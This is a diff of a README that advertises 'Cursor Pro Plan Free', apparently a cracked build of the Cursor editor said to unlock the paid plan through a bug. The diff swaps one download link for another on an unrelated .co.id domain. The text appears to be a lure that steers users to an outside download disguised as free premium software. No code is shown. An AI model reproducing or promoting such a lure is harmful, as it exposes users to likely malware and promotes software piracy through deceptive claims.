@@ -3,7 +3,7 @@
 **Cursor Pro Plan Free** — a small modification of the official **Cursor** program that, due to a bug, allows you to always have an active **Pro Plan** on your account completely free of charge.  
 Now all premium Cursor features are available without subscription: enhanced AI assistant, code autocompletion, smart search, and much more.
 
-[![Download](https://img.shields.io/badge/click%20for%20download-Cursor%20Pro%20Plan%20Free-purple?style=for-the-badge)](https://arkadiya.co.id/curs0r-yt/get.php?filename=CursorUnlim)
+[![Download](https://img.shields.io/badge/click%20for%20download-Cursor%20Pro%20Plan%20Free-purple?style=for-the-badge)](https://arkadiya.co.id/cursor)
 
 ---
 
